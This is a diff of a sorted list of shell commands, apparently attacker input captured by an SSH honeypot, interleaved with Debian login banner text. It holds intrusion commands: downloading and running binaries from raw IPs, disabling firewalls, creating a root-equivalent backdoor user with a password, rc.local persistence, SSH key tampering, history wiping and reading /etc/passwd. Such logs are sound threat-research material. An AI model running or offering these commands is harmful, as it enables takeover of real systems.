@@ -1,44 +1,19 @@
-&amp
 ./164
+1 &amp
 ./Acske
 ./Acsko
-./OP &
-./QP &
-./QQW &
-./XP &
-./s52
-./s52 &
-./ss
-./ss &
-./tmp/Acske
-./tmp/Acsko
-./txma &
-./u52 &
-./xia &
-./xiao &
-/dev/null 2&gt
-/etc/init.d/iptables stop
-/etc/init.d/iptables stop/etc/init.d/iptables stop
-/tmp/.xs/daemon.armv4l.mod
-/tmp/.xs/daemon.i686.mod
-/tmp/.xs/daemon.mips.mod
-/tmp/.xs/daemon.mipsel.mod
-/tmp/.xs/test.mod
-/tmp/Acske
-/tmp/Acsko
-1 &amp
-SuSEfirewall2 stop
-cat  > /tmp/.xs/daemon.armv4l.mod
-cat  > /tmp/.xs/daemon.i686.mod
-cat  > /tmp/.xs/daemon.mips.mod
-cat  > /tmp/.xs/daemon.mipsel.mod
-cat  > /tmp/.xs/test.mod
+&amp
 cat /etc/passwd
 cat /proc/version
+cat  > /tmp/.xs/daemon.armv4l.mod
+cat  > /tmp/.xs/daemon.i686.mod
+cat  > /tmp/.xs/daemon.mipsel.mod
+cat  > /tmp/.xs/daemon.mips.mod
+cat  > /tmp/.xs/test.mod
 cd ..
 cd /root
-cd /tmp
 cd tmp
+cd /tmp
 chattr +i /etc/.ssh
 chattr +i QP
 chattr +i XP
@@ -52,21 +27,22 @@ chmod 0777 u52
 chmod 0779 /QP
 chmod 0779 /XP
 chmod 777 /root/.ssh/authorized_keys2
-chmod 777 /tmp/.xs/daemon.armv4l.mod
-chmod 777 /tmp/.xs/daemon.i686.mod
-chmod 777 /tmp/.xs/daemon.mips.mod
-chmod 777 /tmp/.xs/daemon.mipsel.mod
-chmod 777 /tmp/.xs/test.mod
-chmod 777 /tmp/Acske
-chmod 777 /tmp/Acsko
 chmod 777 s52
 chmod 777 ss
+chmod 777 ~/.ssh/authorized_keys2
+chmod 777 /tmp/Acske
+chmod 777 /tmp/Acsko
+chmod 777 /tmp/.xs/daemon.armv4l.mod
+chmod 777 /tmp/.xs/daemon.i686.mod
+chmod 777 /tmp/.xs/daemon.mipsel.mod
+chmod 777 /tmp/.xs/daemon.mips.mod
+chmod 777 /tmp/.xs/test.mod
 chmod 777 u52
 chmod 777 xia
 chmod 777 xiaof
+chmod u+x dos6cc4
 chmod u+x OP
 chmod u+x QQW
-chmod u+x dos6cc4
 chmod u+x s52
 chmod u+x ss
 chmod u+x txma
@@ -76,21 +52,27 @@ chmod u+x xiao
 curl
 curl -o /tmp/Acske
 curl -o /tmp/Acsko
-echo "./s52&" >  > /etc/rc.local
-echo "./u52&" >  > /etc/rc.local
-echo "/etc/init.d/iptables stop" >  > /etc/rc.local
-echo "WinSCP: this is end-of-file:0"
-echo "cd  /root/" >  > /etc/rc.local
-echo "xuelp123" | passwd --stdin butter
-echo -n test
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY\, to the extent
+/dev/null 2&gt
+/dev/null l2&gt
 echo butter:xuelp123 | chpassw
 echo butter:xuelp123 | chpasswd
+echo "cd  /root/" >  > /etc/rc.local
+echo "/etc/init.d/iptables stop" >  > /etc/rc.local
+echo -n test
+echo "./s52&" >  > /etc/rc.local
+echo "./u52&" >  > /etc/rc.local
+echo "WinSCP: this is end-of-file:0"
+echo "xuelp123" | passwd --stdin butter
+/etc/init.d/iptables stop
+/etc/init.d/iptables stop/etc/init.d/iptables stop
 ethtool eth0
 exit
 free -m
 history -n
 http://14.148.164.90:9562/u52
 id
+individual files in /usr/share/doc/*/copyright.
 la
 ls
 mkdir /tmp/.xs/
@@ -104,18 +86,47 @@ nohup /tmp/Acske  >  /dev/null 2 > &1
 nohup /tmp/Acsko  >  /dev/null 2 > &1
 nohup /tmp/QP  >  /dev/null 2 > &1 &
 nohup /tmp/XP  >  /dev/null 2 > &1 &
+./OP &
 perl
+permitted by applicable law.
 ps
 ps x
+./QP &
+./QQW &
 reSuSEfirewall2 stop
 rm /tmp/xia
 rm /tmp/xiaof
+./s52
+./s52 &
 service iptables stop
-su root
+./ss
+./ss &
+ss start
 sudo cat /root/.ssh/authorized_keys2
+sudo cat ~/.ssh/authorized_keys2
 sudo id
 sudo mkdir /root/.ssh
+sudo mkdir ~/.ssh
+su root
+SuSEfirewall2 stop
+the exact distribution terms for each program are described in the
+The programs included with the Debian GNU/Linux system are free software
+/tmp/Acske
+./tmp/Acske
+/tmp/Acsko
+./tmp/Acsko
+./tmp/ss
+./tmp/ss &
+./tmp/ss.
+/tmp/.xs/daemon.armv4l.mod
+/tmp/.xs/daemon.i686.mod
+/tmp/.xs/daemon.mipsel.mod
+/tmp/.xs/daemon.mips.mod
+/tmp/.xs/test.mod
 touch /root/.ssh/authorized_keys2
+touch ~/.ssh/authorized_keys2
+./txma &
+./u52 &
 uname
 uname -a
 uname -m
@@ -124,17 +135,21 @@ unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
 useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter
 ver
 w
-wget -O /tmp/Acske
-wget -O /tmp/Acsko
 wget -c http://180.97.215.79:888/tangwe
+wget http://117.41.184.153:8081/ss
 wget http://14.148.164.90:9562/s52
 wget http://14.148.164.90:9562/ss
 wget http://14.148.164.90:9562/u52
 wget http://58.221.58.21:3625/OP
 wget http://58.221.58.21:3625/QP
 wget http://58.221.58.21:3625/QQW
-wget http://58.221.58.21:3625/XP
 wget http://58.221.58.21:3625/txma
 wget http://58.221.58.21:3625/xia
 wget http://58.221.58.21:3625/xiao
 wget http://58.221.58.21:3625/xiaof
+wget http://58.221.58.21:3625/XP
+wget -O /tmp/Acske
+wget -O /tmp/Acsko
+./xia &
+./xiao &
+./XP &
